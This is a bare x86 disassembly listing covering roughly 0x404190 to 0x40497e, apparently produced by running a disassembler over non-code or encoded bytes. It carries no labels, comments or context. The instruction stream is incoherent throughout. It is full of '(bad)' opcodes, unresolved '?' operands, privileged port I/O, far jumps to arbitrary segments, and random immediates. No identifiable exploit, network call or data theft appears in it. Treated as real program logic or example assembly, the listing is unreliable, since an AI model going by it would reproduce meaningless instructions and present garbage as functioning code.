  404190:	mov    ds:0xce190fc,al
  404195:	sbb    dl,BYTE PTR [edx]
  404197:	xor    DWORD PTR [edx-0x52d2ea4],edi
  40419d:	fdiv   DWORD PTR [ebx]
  40419f:	push   0x611caaef
  4041a4:	push   ecx
  4041a5:	cmc    
  4041a6:	sub    edi,DWORD PTR [edi]
  4041a8:	adc    DWORD PTR [ebx],esp
  4041aa:	pop    ebx
  4041ab:	mov    al,ds:0x9bc734f0
  4041b0:	mov    ebx,0x58ccf339
  4041b5:	xchg   ebx,eax
  4041b6:	inc    edi
  4041b7:	int3   
  4041b8:	add    al,0x51
  4041ba:	(bad)  
  4041bb:	xor    esp,DWORD PTR [edx]
  4041bd:	xor    BYTE PTR [edx+ebp*4+0x1d],dh
  4041c1:	aam    0xdb
  4041c3:	sub    dh,BYTE PTR [eax]
  4041c5:	stos   BYTE PTR es:[edi],al
  4041c6:	imul   ecx,DWORD PTR [ebp+0x76],0xb780e259
  4041cd:	or     BYTE PTR [ebx-0xa],dh
  4041d0:	push   ds
  4041d1:	out    dx,al
  4041d2:	test   BYTE PTR ds:0xbd532188,ah
  4041d8:	inc    ecx
  4041d9:	je     0x4041bf
  4041db:	mov    edi,0x9f0c8551
  4041e0:	sbb    eax,0x85bf2d19
  4041e5:	les    eax,FWORD PTR [ebx+0xaa0b430]
  4041eb:	mov    bh,0x9
  4041ed:	aad    0xd6
  4041ef:	mov    ecx,0xaab1cbc6
  4041f4:	std    
  4041f5:	pop    eax
  4041f6:	mov    edi,0x389648ad
  4041fb:	pop    ss
  4041fc:	jns    0x4041b9
  4041fe:	enter  0x3482,0xca
  404202:	sub    al,0x3e
  404204:	sti    
  404205:	dec    esi
  404206:	iret   
  404207:	add    ebp,edx
  404209:	or     bl,BYTE PTR [eax-0x1a30aacc]
  40420f:	cdq    
  404210:	in     eax,dx
  404211:	mov    al,0x34
  404213:	mov    ?,edi
  404215:	mov    ebx,0x581ec51f
  40421a:	mov    cl,0x6e
  40421c:	or     eax,0x3997f6c9
  404221:	sbb    BYTE PTR [ecx],ah
  404223:	ja     0x404232
  404225:	mov    ax,0x593e
  404229:	dec    esp
  40422a:	test   al,0xa1
  40422c:	cmp    eax,esi
  40422e:	jp     0x404209
  404230:	stc    
  404231:	pusha  
  404232:	dec    ebx
  404233:	adc    al,0x92
  404235:	cld    
  404236:	mov    ds:0xfac6cb81,eax
  40423b:	xchg   esi,eax
  40423c:	fbstp  TBYTE PTR [edi]
  40423e:	pushf  
  40423f:	jmp    0x460c:0x8263fd59
  404246:	or     al,0x52
  404248:	ret    
  404249:	sub    BYTE PTR [ebx+0x257ec8a7],ch
  40424f:	sbb    eax,0x24d808fd
  404254:	adc    BYTE PTR [ecx],dl
  404256:	adc    BYTE PTR [ecx+0x2ba9cddd],ch
  40425c:	cdq    
  40425d:	dec    esi
  40425e:	sub    BYTE PTR [ecx],ah
  404260:	sub    DWORD PTR [esi+0x1fb856cc],0x8f0df210
  40426a:	(bad)  
  40426b:	ror    BYTE PTR [edi],cl
  40426d:	cmc    
  40426e:	push   edi
  40426f:	adc    ebp,esi
  404271:	adc    al,bh
  404273:	ret    
  404274:	mov    ds:0x46a62ec0,al
  404279:	(bad)  
  40427a:	or     al,0xf9
  40427c:	mov    esi,0x9d34c27f
  404281:	int    0x5f
  404283:	addr16 (bad) 
  404285:	mov    WORD PTR [edx-0x1bfcfeba],es
  40428b:	mov    ds:0x77f0b50b,al
  404290:	and    DWORD PTR [ecx],ebx
  404292:	in     al,0x15
  404294:	fisub  WORD PTR [ecx+0x34c87605]
  40429a:	in     al,0x1d
  40429c:	push   ds
  40429d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40429e:	mov    ecx,0xfc27ee9a
  4042a3:	xor    eax,0xed040119
  4042a8:	jecxz  0x4042dc
  4042aa:	cmp    ebp,0xffffffd5
  4042ad:	aaa    
  4042ae:	ret    
  4042af:	mov    eax,0x9c8bfd9f
  4042b4:	inc    edx
  4042b5:	xor    DWORD PTR [edi+0x394928f2],esp
  4042bb:	mov    ds:0x34016b46,eax
  4042c0:	cli    
  4042c1:	ret    0x474
  4042c4:	out    dx,al
  4042c5:	jmp    0x285c:0x900c40b
  4042cc:	mov    ch,0xb2
  4042ce:	push   0x1e86488f
  4042d3:	lods   eax,DWORD PTR ds:[esi]
  4042d4:	fs hlt 
  4042d6:	out    dx,eax
  4042d7:	mov    esi,0x3a8bd362
  4042dc:	aaa    
  4042dd:	dec    ebp
  4042de:	add    eax,DWORD PTR [edx-0x4eaf7ffb]
  4042e4:	inc    esp
  4042e5:	shr    BYTE PTR [ecx+0x7e],1
  4042e8:	in     al,dx
  4042e9:	(bad)  
  4042ea:	cdq    
  4042eb:	sbb    bl,al
  4042ed:	popa   
  4042ee:	cmpxchg DWORD PTR [esi],edx
  4042f1:	sub    cl,ch
  4042f3:	cmp    al,0x26
  4042f5:	jne    0x4042a9
  4042f7:	shl    DWORD PTR [eax+0x4f114d7f],0xa6
  4042fe:	cmp    DWORD PTR [ebp-0x6cbd65c5],0xffffffaa
  404305:	es mov cl,0x42
  404308:	push   ecx
  404309:	add    ebp,DWORD PTR [eax+edx*2]
  40430c:	jmp    0x404320
  40430e:	and    eax,0x6f09fb01
  404313:	loop   0x404355
  404315:	ins    DWORD PTR es:[edi],dx
  404316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404317:	sub    bl,0x81
  40431a:	mov    ss,WORD PTR [edi+0x27]
  40431d:	jns    0x404393
  40431f:	adc    ebp,esi
  404321:	xor    BYTE PTR [esi+esi*4],al
  404324:	test   eax,0xcfb1bd8e
  404329:	(bad)  
  40432a:	clc    
  40432b:	xor    al,0xda
  40432d:	mov    dh,0x3d
  40432f:	gs pop esi
  404331:	push   esp
  404332:	mov    ch,0xfe
  404334:	stos   DWORD PTR es:[edi],eax
  404335:	pop    esi
  404336:	xor    BYTE PTR [esi+0x6211a7f5],ah
  40433c:	cdq    
  40433d:	mov    dl,0x2
  40433f:	(bad)  
  404340:	sub    cl,BYTE PTR [esi+0x67]
  404343:	test   BYTE PTR [eax],ah
  404345:	or     eax,0x785b534a
  40434a:	push   ecx
  40434b:	xchg   ebp,eax
  40434c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40434d:	jb     0x404356
  40434f:	imul   ebp,DWORD PTR ds:0x99a78357,0xffffffc9
  404356:	stos   BYTE PTR es:[edi],al
  404357:	cmp    eax,0x6c69de00
  40435c:	call   0xb77d:0x28e30c5c
  404363:	retf   
  404364:	idiv   eax
  404366:	lock ss jb 0x404364
  40436a:	outs   dx,DWORD PTR ds:[esi]
  40436b:	or     esp,esp
  40436d:	xlat   BYTE PTR ds:[ebx]
  40436e:	retf   0x1278
  404371:	mov    esi,0xa71b0b8d
  404376:	push   ds
  404377:	imul   ebp,DWORD PTR [esi],0xca93639a
  40437d:	dec    edi
  40437e:	mul    DWORD PTR [ecx-0x36]
  404381:	aaa    
  404382:	mov    eax,0x7e16c71e
  404387:	mov    ch,0xf6
  404389:	jecxz  0x404384
  40438b:	dec    ebx
  40438c:	out    dx,eax
  40438d:	outs   dx,BYTE PTR ds:[esi]
  40438e:	pop    es
  40438f:	jle    0x404342
  404391:	mov    al,0x4e
  404393:	scas   al,BYTE PTR es:[edi]
  404394:	push   esp
  404395:	push   ss
  404396:	sub    al,0x3c
  404398:	adc    al,0xf3
  40439a:	or     eax,0xb9745ae9
  40439f:	push   ss
  4043a0:	jmp    0x40437f
  4043a2:	lahf   
  4043a3:	(bad)  
  4043a4:	jge    0x404367
  4043a6:	shr    DWORD PTR [ebx+eiz*8],cl
  4043a9:	clc    
  4043aa:	shl    BYTE PTR [ebp-0x10],0xf8
  4043ae:	int    0x6b
  4043b0:	les    ebx,FWORD PTR [ecx-0x2b88b919]
  4043b6:	(bad)  
  4043b8:	and    al,0xc1
  4043ba:	ins    DWORD PTR es:[edi],dx
  4043bb:	fdivr  st,st(2)
  4043bd:	cmp    ch,bh
  4043bf:	mov    ecx,0x7597da9b
  4043c4:	pop    ss
  4043c5:	ja     0x404425
  4043c7:	push   DWORD PTR [eax]
  4043c9:	cld    
  4043ca:	jnp    0x4043c8
  4043cc:	jb     0x40434e
  4043ce:	jmp    0x9395:0xdb5bcbaf
  4043d5:	inc    eax
  4043d6:	xor    eax,0x93fecd6b
  4043db:	mov    ebp,0xb9cb1f4
  4043e0:	pop    esi
  4043e1:	(bad)  
  4043e2:	pushf  
  4043e3:	lahf   
  4043e4:	mov    bl,0xe7
  4043e6:	int3   
  4043e7:	ins    DWORD PTR es:[edi],dx
  4043e8:	pop    edx
  4043e9:	stc    
  4043ea:	fdivr  QWORD PTR [ecx-0x38420c5c]
  4043f0:	adc    ah,0xba
  4043f3:	popf   
  4043f4:	and    al,bl
  4043f6:	int3   
  4043f7:	jl     0x404433
  4043f9:	and    ebx,DWORD PTR [edi-0x20c1eb77]
  4043ff:	or     al,0xdb
  404401:	leave  
  404402:	lahf   
  404403:	push   ecx
  404404:	inc    edi
  404406:	fs and edx,esi
  404409:	jo     0x40439a
  40440b:	loop   0x4043bb
  40440d:	adc    dh,ah
  40440f:	dec    esp
  404410:	and    esp,DWORD PTR [esi+0x7bfcf745]
  404416:	daa    
  404417:	nop
  404418:	dec    ecx
  404419:	xchg   esp,eax
  40441a:	dec    edi
  40441b:	lock jbe 0x4043a4
  40441e:	out    0x2d,eax
  404420:	adc    edi,DWORD PTR [eax+esi*1+0x35]
  404424:	pop    ebp
  404425:	cmp    bh,BYTE PTR [eax+edx*8+0x5b]
  404429:	repnz retf 
  40442b:	test   BYTE PTR [edi],al
  40442d:	fistp  DWORD PTR [eax]
  40442f:	xchg   esi,eax
  404430:	xor    bl,BYTE PTR [edx]
  404432:	(bad)  
  404433:	enter  0xed89,0xfa
  404437:	call   0x81774246
  40443c:	jle    0x4043e3
  40443e:	add    eax,0x2fd44342
  404443:	pop    ebp
  404444:	inc    edi
  404445:	push   ds
  404446:	and    ah,BYTE PTR [ecx+0x17]
  404449:	xchg   ebp,eax
  40444a:	call   0xb91b:0x43d2f1e9
  404451:	mov    ebp,0xb0daeec5
  404456:	test   al,0x8a
  404458:	fsub   QWORD PTR [ebx]
  40445a:	ja     0x40445d
  40445c:	fs test bh,ah
  40445f:	jge    0x404497
  404461:	add    esi,ebx
  404463:	dec    ecx
  404464:	(bad)  
  404465:	dec    edi
  404466:	fmul   DWORD PTR [edi+0x64e935c]
  40446c:	gs sbb ebp,ecx
  40446f:	loope  0x4044db
  404471:	jbe    0x4044b3
  404473:	ins    DWORD PTR es:[edi],dx
  404474:	pusha  
  404475:	pop    ecx
  404476:	push   ecx
  404477:	mov    esi,0xd0e1ffa7
  40447c:	xchg   esp,eax
  40447d:	rcl    ch,1
  40447f:	fmulp  st(4),st
  404481:	test   BYTE PTR [ecx-0x37e930c9],ch
  404487:	cld    
  404488:	jl     0x404484
  40448a:	cdq    
  40448b:	sub    al,0x44
  40448d:	out    dx,al
  40448e:	dec    ebp
  40448f:	retf   0x7d3e
  404492:	(bad)  
  404493:	(bad)  [edi-0x58]
  404496:	out    0xf,ax
  404499:	in     al,dx
  40449a:	xor    dh,BYTE PTR [eax+0x6d9124a9]
  4044a0:	(bad)  
  4044a1:	aam    0xfd
  4044a3:	in     al,0xbc
  4044a5:	mov    bl,0x50
  4044a7:	adc    DWORD PTR es:[eax],0xffffff8c
  4044ab:	or     dh,BYTE PTR ds:0x74ea3b33
  4044b1:	stos   DWORD PTR es:[edi],eax
  4044b2:	inc    esi
  4044b3:	test   eax,0x9753b166
  4044b8:	in     al,0x3
  4044ba:	sub    DWORD PTR [esp+eax*8-0x4f17b786],0xffffff85
  4044c2:	dec    edx
  4044c3:	push   ds
  4044c4:	iret   
  4044c5:	dec    esi
  4044c6:	ror    BYTE PTR [ebp+0x10861fec],0xd3
  4044cd:	mov    edx,0xc506e5b1
  4044d2:	pop    ebx
  4044d3:	or     eax,0xa222e3fe
  4044d8:	pop    edi
  4044d9:	push   esi
  4044da:	mov    edi,0xb4a55b74
  4044df:	faddp  st(4),st
  4044e1:	fld    TBYTE PTR [ebx+0xa]
  4044e4:	mov    ch,0x9a
  4044e6:	icebp  
  4044e7:	push   edi
  4044e8:	pop    es
  4044e9:	stos   BYTE PTR es:[edi],al
  4044ea:	int    0x19
  4044ec:	xlat   BYTE PTR ds:[ebx]
  4044ed:	ret    0xe65e
  4044f0:	rcl    ah,1
  4044f2:	inc    DWORD PTR [ebx-0x4876076b]
  4044f8:	mov    ch,0x42
  4044fa:	je     0x404489
  4044fc:	sbb    DWORD PTR [edx],ebx
  4044fe:	or     eax,0x2316f965
  404503:	pop    ecx
  404504:	pusha  
  404505:	stc    
  404506:	mov    ?,WORD PTR [edi]
  404508:	out    0x82,eax
  40450a:	inc    esi
  40450b:	mov    cl,BYTE PTR [edx+edi*2+0x4d]
  40450f:	sub    bh,BYTE PTR [esi+eax*2+0x190e99eb]
  404516:	mov    dh,0xb0
  404518:	retf   0x4ee5
  40451b:	jnp    0x4044fb
  40451d:	call   0x372e:0xd71e1f31
  404524:	sub    eax,0xdfa42e6b
  404529:	(bad)  
  40452a:	fnsave [ecx]
  40452c:	addr16 push esi
  40452e:	ss out 0x49,al
  404531:	inc    ebp
  404532:	mov    BYTE PTR [ebp-0x4bb894ce],al
  404538:	xor    BYTE PTR [ebp+0x1f8be043],dl
  40453e:	sahf   
  40453f:	mov    esp,es
  404541:	sbb    al,0x70
  404543:	aad    0x3a
  404545:	lods   eax,DWORD PTR ds:[esi]
  404546:	xchg   esp,eax
  404547:	inc    edx
  404548:	inc    edx
  404549:	mov    dl,0x8b
  40454b:	cmp    eax,0xac22f08
  404550:	arpl   bx,bx
  404552:	jmp    0x85f9:0x6fbfa2c6
  404559:	test   DWORD PTR [eax+0x1e],esp
  40455c:	jne    0x404565
  40455e:	ins    DWORD PTR es:[edi],dx
  40455f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404560:	add    dl,BYTE PTR [esi+0x462c8fea]
  404566:	jmp    0x4045d2
  404568:	xchg   edx,eax
  404569:	dec    ecx
  40456a:	and    esp,ebp
  40456c:	inc    edi
  40456d:	sar    edi,cl
  40456f:	pop    esi
  404570:	iret   
  404571:	add    al,0xf6
  404573:	call   0x3e71a784
  404578:	inc    eax
  404579:	mov    ds:0x3a18d83d,eax
  40457e:	jo     0x404522
  404580:	xor    cl,BYTE PTR [ecx]
  404582:	pop    edi
  404583:	outs   dx,DWORD PTR ds:[esi]
  404584:	sbb    esp,DWORD PTR [eax]
  404586:	sub    al,0xbc
  404588:	jp     0x4045b6
  40458a:	mov    ds:0x3e4d6902,al
  40458f:	fisttp QWORD PTR [edi+0x18]
  404592:	jnp    0x40456c
  404594:	int    0x68
  404596:	inc    edi
  404597:	ss mov dl,0xdf
  40459a:	outs   dx,BYTE PTR ds:[esi]
  40459b:	xchg   ebp,eax
  40459c:	mov    al,0x2e
  40459e:	idiv   eax
  4045a0:	outs   dx,DWORD PTR ds:[esi]
  4045a1:	inc    esi
  4045a2:	test   DWORD PTR [bp+di],esi
  4045a5:	call   0x1d8a575a
  4045aa:	mov    edx,0xcb4098c6
  4045af:	out    dx,al
  4045b0:	out    0xa4,eax
  4045b2:	inc    eax
  4045b3:	sbb    eax,0x8fc1db3d
  4045b8:	ins    DWORD PTR es:[edi],dx
  4045b9:	ins    BYTE PTR es:[edi],dx
  4045ba:	fs hlt 
  4045bc:	jnp    0x4045ac
  4045be:	or     al,0x90
  4045c0:	cmp    al,0x44
  4045c2:	cmp    BYTE PTR [ecx+0x55eab1a4],ah
  4045c8:	gs and esi,eax
  4045cb:	xor    eax,0xe5b6bc75
  4045d0:	inc    esi
  4045d1:	adc    bh,bh
  4045d3:	jo     0x404563
  4045d5:	adc    ebx,DWORD PTR [edi+0x1d]
  4045d8:	loopne 0x40464d
  4045da:	mov    BYTE PTR [ecx],bl
  4045dc:	in     eax,dx
  4045dd:	mov    esi,0x43033f49
  4045e2:	cmp    edx,ebp
  4045e4:	cwde   
  4045e5:	leave  
  4045e6:	xchg   ebp,eax
  4045e7:	add    al,0x59
  4045e9:	xor    ebp,DWORD PTR [edx-0x80]
  4045ec:	mov    bh,ah
  4045ee:	leave  
  4045ef:	jb     0x404581
  4045f1:	outs   dx,DWORD PTR ds:[esi]
  4045f2:	mov    ch,0x25
  4045f4:	mov    ds:0x5d58da21,al
  4045f9:	fs cdq 
  4045fb:	xor    DWORD PTR [esp+ebx*8+0x2e],edi
  4045ff:	xor    eax,0x72ea0755
  404604:	push   0x77
  404606:	jg     0x404614
  404608:	adc    al,0x45
  40460a:	xchg   edi,eax
  40460b:	push   es
  40460c:	lds    esp,FWORD PTR [ebx+0x76e74b3c]
  404612:	out    dx,al
  404613:	xchg   ebx,eax
  404614:	repnz mov ebp,0xfe336b37
  40461a:	cwde   
  40461b:	fstp   st(3)
  40461d:	in     eax,0x60
  40461f:	mov    eax,0x4c654505
  404624:	mov    dh,dh
  404626:	pop    esi
  404627:	xor    ecx,ecx
  404629:	and    eax,0x1df88169
  40462e:	imul   ebx,edi,0x7da4ac9f
  404634:	aas    
  404635:	enter  0xcc3c,0x69
  404639:	pop    esi
  40463a:	(bad)  
  40463b:	outs   dx,BYTE PTR ds:[esi]
  40463c:	mov    bh,0x67
  40463e:	mov    ecx,0xcf1f4928
  404643:	inc    eax
  404644:	daa    
  404645:	mov    ah,0x1d
  404647:	ret    0x4356
  40464a:	int3   
  40464b:	rcr    DWORD PTR [esi],cl
  40464d:	sar    eax,1
  40464f:	scas   eax,DWORD PTR es:[edi]
  404650:	cdq    
  404651:	cmp    edi,DWORD PTR [ecx+0x78]
  404654:	adc    DWORD PTR [edi],ecx
  404656:	xor    eax,0xe1b37e10
  40465b:	push   cs
  40465c:	pop    edi
  40465d:	mov    ebp,0xd23975d3
  404662:	sub    bl,BYTE PTR [edi+eax*8+0x9]
  404666:	xchg   esp,eax
  404667:	pop    ebp
  404668:	scas   eax,DWORD PTR es:[edi]
  404669:	popa   
  40466a:	int    0x79
  40466c:	lock dec ecx
  40466e:	icebp  
  40466f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404670:	pop    ecx
  404671:	das    
  404672:	xchg   ebp,eax
  404673:	inc    ecx
  404674:	clc    
  404675:	pop    edi
  404676:	pop    edi
  404677:	cmc    
  404678:	int3   
  404679:	push   edi
  40467a:	lea    edi,[esi]
  40467c:	fs or  eax,0x3804eb60
  404682:	mov    eax,0xce7b7b6b
  404687:	rol    DWORD PTR [eax],cl
  404689:	mov    es,WORD PTR [ecx-0xcc7fe2f]
  40468f:	jne    0x404632
  404691:	loopne 0x404677
  404693:	aaa    
  404694:	je     0x40466c
  404696:	sub    bh,BYTE PTR [eax+esi*1-0x55]
  40469a:	dec    ebp
  40469b:	add    BYTE PTR [edx],ah
  40469d:	cld    
  40469e:	popa   
  40469f:	cmp    eax,0xab1c1469
  4046a4:	or     DWORD PTR [edx],edi
  4046a6:	aas    
  4046a7:	pop    ds
  4046a8:	inc    DWORD PTR [ebp+0x3bc9261]
  4046ae:	clc    
  4046af:	imul   BYTE PTR [esi]
  4046b1:	mov    bh,BYTE PTR [ebx]
  4046b3:	sbb    ebp,ebx
  4046b5:	adc    al,BYTE PTR [ecx+0xb]
  4046b8:	sar    BYTE PTR [ecx],cl
  4046ba:	cli    
  4046bb:	jb     0x4046d1
  4046bd:	inc    ebp
  4046be:	(bad)  
  4046c0:	or     esp,DWORD PTR [ebx+0x19c366fa]
  4046c6:	int    0x25
  4046c8:	ret    
  4046c9:	rcr    BYTE PTR [edx-0x78b2ca6d],cl
  4046cf:	pop    ecx
  4046d0:	or     al,0x91
  4046d2:	or     ebx,esp
  4046d4:	dec    eax
  4046d5:	loop   0x404743
  4046d7:	inc    ecx
  4046d8:	enter  0x81f5,0xdd
  4046dc:	loop   0x404713
  4046de:	fbstp  TBYTE PTR [edi]
  4046e0:	nop
  4046e1:	push   edi
  4046e2:	push   edi
  4046e3:	mov    ch,0xf9
  4046e5:	je     0x4046a6
  4046e7:	mov    esi,ds
  4046e9:	mov    dh,0x17
  4046eb:	test   al,0xc9
  4046ed:	leave  
  4046ee:	inc    ebx
  4046ef:	cmc    
  4046f0:	test   eax,0xb8740d6f
  4046f5:	gs ss fdivrp st(1),st
  4046f9:	bound  ebp,QWORD PTR [edx-0x24]
  4046fc:	xchg   ebp,eax
  4046fd:	call   0xacae7e97
  404702:	(bad)  
  404703:	or     ebp,DWORD PTR [ecx+edi*2+0x15]
  404707:	xchg   DWORD PTR [ebp-0xe421376],esi
  40470d:	test   dl,cl
  40470f:	lods   al,BYTE PTR ds:[esi]
  404710:	bnd jg 0x40473a
  404713:	push   gs
  404715:	mov    bh,0x5e
  404717:	lods   al,BYTE PTR ds:[esi]
  404718:	push   0x7af31f7a
  40471d:	repz adc ax,si
  404721:	dec    esi
  404722:	(bad)  
  404723:	cld    
  404724:	cld    
  404725:	sysexit 
  404727:	push   ebx
  404728:	dec    ebx
  404729:	scas   al,BYTE PTR es:[edi]
  40472a:	fwait
  40472b:	(bad)  
  40472c:	outs   dx,DWORD PTR ds:[esi]
  40472d:	mov    ebx,0x28960f47
  404732:	xchg   ebx,eax
  404733:	mov    BYTE PTR [ebp+0x50],dl
  404736:	int3   
  404737:	adc    eax,0x6ff0db13
  40473c:	xor    eax,0x86c0f36b
  404741:	mov    ecx,ecx
  404743:	gs leave 
  404745:	add    al,BYTE PTR [ecx-0x5d]
  404748:	test   BYTE PTR [eax+ebp*1],ch
  40474b:	ins    DWORD PTR es:[edi],dx
  40474c:	loope  0x404718
  40474e:	dec    edi
  40474f:	pop    ss
  404750:	(bad)  
  404752:	push   ebx
  404753:	cdq    
  404754:	add    dl,BYTE PTR [esi]
  404756:	pop    ebx
  404757:	retf   
  404758:	sub    eax,0xd0bb2305
  40475d:	shl    BYTE PTR [esi],0x4a
  404760:	fisubr WORD PTR [edx+ecx*4+0x1f742e3c]
  404767:	or     DWORD PTR [edx+esi*2+0x7a86261c],ebp
  40476e:	jne    0x40472d
  404770:	pusha  
  404771:	jno    0x4047c3
  404773:	mov    eax,0x332143e6
  404778:	or     ecx,DWORD PTR [esi]
  40477a:	test   al,0xe
  40477c:	aas    
  40477d:	jne    0x40477b
  40477f:	xor    BYTE PTR [ebx+ebx*8+0x45f4ff30],0x65
  404787:	jge    0x4047cc
  404789:	retf   
  40478a:	push   edi
  40478b:	cwde   
  40478c:	mov    ds:0x5bdc156d,eax
  404791:	inc    ecx
  404792:	sbb    eax,0x6039ad40
  404797:	mov    DWORD PTR [edx-0x70],eax
  40479a:	mov    eax,ds:0xdbe713e6
  40479f:	out    dx,eax
  4047a0:	adc    DWORD PTR [ecx-0x38],ecx
  4047a3:	inc    ebp
  4047a4:	in     al,dx
  4047a5:	popa   
  4047a6:	add    ecx,DWORD PTR [edi-0x31]
  4047a9:	dec    ebx
  4047aa:	sbb    eax,0xeff09ee7
  4047af:	mov    dl,0xf4
  4047b1:	pop    es
  4047b2:	mov    ebp,0xe1d45cff
  4047b7:	frstor [edx-0x8]
  4047ba:	xchg   edi,eax
  4047bb:	mov    dh,0xd4
  4047bd:	call   0xdd9f:0x32db9898
  4047c4:	xchg   ebx,eax
  4047c5:	out    0x3b,al
  4047c7:	fdiv   QWORD PTR [edx]
  4047c9:	adc    eax,0xc7254161
  4047ce:	test   DWORD PTR [ebp-0x41547920],esi
  4047d4:	shl    BYTE PTR [ebx-0xb],1
  4047d7:	mov    ah,0xca
  4047d9:	jge    0x4047f6
  4047db:	or     eax,DWORD PTR [ecx-0x49]
  4047de:	jb     0x4047c4
  4047e0:	hlt    
  4047e1:	cs xchg edi,eax
  4047e3:	aas    
  4047e4:	in     al,0x95
  4047e6:	push   edx
  4047e7:	mov    ecx,DWORD PTR [eax+eax*2-0x1a]
  4047eb:	mov    eax,0x481ed30
  4047f0:	xchg   ebp,eax
  4047f1:	test   eax,0x66668de1
  4047f6:	push   edx
  4047f7:	jae    0x40484c
  4047f9:	data16 out dx,al
  4047fb:	mov    cl,0xb9
  4047fd:	xlat   BYTE PTR ds:[ebx]
  4047fe:	ror    BYTE PTR [ecx-0x2a74a14b],1
  404804:	mov    cl,0xdb
  404806:	dec    edi
  404807:	aaa    
  404808:	rcr    DWORD PTR ds:0xb0860bf9,0x71
  40480f:	out    0xd4,eax
  404811:	mov    eax,ds:0x462b46f5
  404816:	mov    al,0x64
  404818:	pop    es
  404819:	xchg   BYTE PTR [esi+ecx*8],cl
  40481c:	not    DWORD PTR [ecx]
  40481e:	ja     0x4047ef
  404820:	cdq    
  404821:	and    dh,bl
  404823:	or     bl,BYTE PTR ds:0xe0e32a44
  404829:	into   
  40482a:	sti    
  40482b:	jbe    0x4048a7
  40482d:	push   0x4f88f36
  404832:	cli    
  404833:	gs xchg esp,eax
  404835:	push   es
  404836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404837:	cmp    DWORD PTR [ebp-0x14],esp
  40483a:	add    ch,bl
  40483c:	ins    DWORD PTR es:[edi],dx
  40483d:	pop    esp
  40483e:	fstp   DWORD PTR [ebp+0x40403877]
  404844:	(bad)  
  404845:	in     eax,0x1d
  404847:	and    bh,BYTE PTR [edi+0x5d0b41b3]
  40484d:	out    0x3e,al
  40484f:	jp     0x4048be
  404851:	sub    dh,BYTE PTR [ebx+0x7e]
  404854:	or     eax,esp
  404856:	mov    ds:0x6759d4af,eax
  40485b:	lods   eax,DWORD PTR ds:[esi]
  40485c:	and    DWORD PTR [edi+esi*2+0xc9701d],eax
  404863:	adc    DWORD PTR [ecx-0x70],esp
  404866:	jae    0x40482c
  404868:	push   esp
  404869:	cmp    BYTE PTR ds:0x51a0de28,bl
  40486f:	or     DWORD PTR [esi+0x4f],edi
  404872:	dec    edi
  404873:	xlat   BYTE PTR ds:[ebx]
  404874:	lea    ebx,[eax-0x1d55c719]
  40487a:	into   
  40487b:	out    dx,al
  40487c:	aam    0x30
  40487e:	push   edi
  40487f:	push   es
  404880:	push   cs
  404881:	or     edi,ebp
  404883:	(bad)  
  404884:	mov    eax,fs:0x70a325da
  40488a:	mov    cs,WORD PTR [ecx+0x65]
  40488d:	cdq    
  40488e:	pop    esp
  40488f:	jns    0x40482a
  404891:	xchg   esi,eax
  404892:	xchg   ebx,eax
  404893:	xor    al,0xf
  404895:	push   esp
  404896:	mov    ecx,0x7d30a133
  40489b:	xor    edx,DWORD PTR [edi]
  40489d:	daa    
  40489e:	unpcklps xmm4,xmm2
  4048a1:	in     eax,0xf1
  4048a3:	std    
  4048a4:	fdiv   QWORD PTR [eax-0x3a]
  4048a7:	dec    edi
  4048a8:	xlat   BYTE PTR ds:[ebx]
  4048a9:	in     eax,0x95
  4048ab:	inc    ebx
  4048ac:	sub    DWORD PTR [edx+0x720990be],edi
  4048b2:	stc    
  4048b3:	mov    edx,0x85a5dcfc
  4048b8:	mov    DWORD PTR [eax-0x2ce78d37],0x641e634
  4048c2:	stos   DWORD PTR es:[edi],eax
  4048c3:	pop    ebp
  4048c4:	loop   0x40493b
  4048c6:	mov    ds:0x7fe30f29,al
  4048cb:	sbb    BYTE PTR [ebp+0x227bee95],bl
  4048d1:	ins    BYTE PTR es:[edi],dx
  4048d2:	call   0xbd99bdb5
  4048d7:	ror    DWORD PTR [edi-0x75],0xf8
  4048db:	(bad)  
  4048dc:	imul   ebx,DWORD PTR [eax+0x28],0x8da6d02e
  4048e3:	imul   edx,DWORD PTR [esi],0x8
  4048e6:	xor    BYTE PTR [edi],bl
  4048e8:	js     0x40492b
  4048ea:	jp     0x40493e
  4048ec:	mov    cl,0x63
  4048ee:	add    DWORD PTR [edi+0x7a],esp
  4048f1:	sar    DWORD PTR [ebx+0x28d8b6],1
  4048f7:	shl    BYTE PTR [esi],0x1f
  4048fa:	ins    BYTE PTR es:[edi],dx
  4048fb:	mov    cl,0xd2
  4048fd:	inc    ecx
  4048fe:	test   eax,0x3d6c0580
  404903:	mov    DWORD PTR [esi+0x49],ebx
  404906:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404908:	adc    dl,BYTE PTR [ecx-0x78]
  40490b:	push   esp
  40490c:	push   ecx
  40490d:	icebp  
  40490e:	push   cs
  40490f:	shl    BYTE PTR [esi+0x2879ab6f],1
  404915:	loopne 0x4048b8
  404917:	adc    dl,dl
  404919:	leave  
  40491a:	cmp    BYTE PTR fs:[ecx],0xa0
  40491e:	test   eax,0x77055d4e
  404923:	nop
  404924:	mov    ebp,0xc927ae7c
  404929:	xor    cl,BYTE PTR ds:0x84bde6f0
  40492f:	mov    dl,0xf0
  404931:	pop    ds
  404932:	and    ecx,DWORD PTR [edx]
  404934:	arpl   WORD PTR [eax-0x481ce07c],ax
  40493a:	jl     0x40495c
  40493c:	inc    ebx
  40493d:	aaa    
  40493e:	push   cs
  40493f:	pop    edx
  404940:	pop    ecx
  404941:	xchg   esi,eax
  404942:	stos   DWORD PTR es:[edi],eax
  404943:	add    DWORD PTR [ebx],0x1e
  404946:	sti    
  404947:	push   edi
  404948:	(bad)  
  404949:	pusha  
  40494a:	push   eax
  40494b:	inc    DWORD PTR [ebp-0x4d61c0d3]
  404951:	mov    edi,0x8cd3e2a1
  404956:	add    BYTE PTR [esi+eax*1+0x4d],ah
  40495a:	gs retf 0xa049
  40495e:	aam    0xa1
  404960:	mov    edx,0x7ae9d4a3
  404965:	xlat   BYTE PTR ds:[ebx]
  404966:	call   FWORD PTR [edx+eiz*1+0x6db8a3c4]
  40496d:	mov    ds:0xbe7c0d1e,eax
  404972:	jmp    0x9a26:0x7ff6417c
  404979:	mov    eax,ds:0x3678f80e
  40497e:	xor    BYTE PTR ds:0xfe310b9f,cl
